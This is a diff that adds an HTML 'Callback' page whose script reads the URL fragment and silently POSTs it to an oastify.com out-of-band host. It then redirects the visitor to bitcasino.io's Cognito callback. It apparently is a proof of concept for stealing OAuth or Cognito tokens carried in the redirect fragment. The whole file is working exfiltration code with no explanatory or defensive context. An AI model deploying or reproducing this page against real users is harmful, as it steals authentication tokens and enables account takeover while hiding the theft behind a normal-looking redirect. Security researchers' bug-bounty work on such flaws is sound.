@@ -1,0 +1,36 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="UTF-8" />
+  <title>Callback</title>
+</head>
+<body>
+<script>
+
+(async () => {
+  const fragment = window.location.hash.substring(1);
+  console.log(fragment);
+
+  try {
+    await fetch("https://1xzlrhlx3rrtkrb9hyk70swntez5rtkh9.oastify.com/", {
+      method: "POST",
+      headers: {
+        "Content-Type": "application/x-www-form-urlencoded"
+      },
+      body: new URLSearchParams({ fragment: fragment })
+    });
+
+   
+    window.location.href = "https://bitcasino.io/cognito-callback";
+
+  } catch (e) {
+    console.log("error:", e);
+   
+    window.location.href = "https://bitcasino.io/cognito-callback";
+  }
+
+})();
+
+</script>
+</body>
+</html>
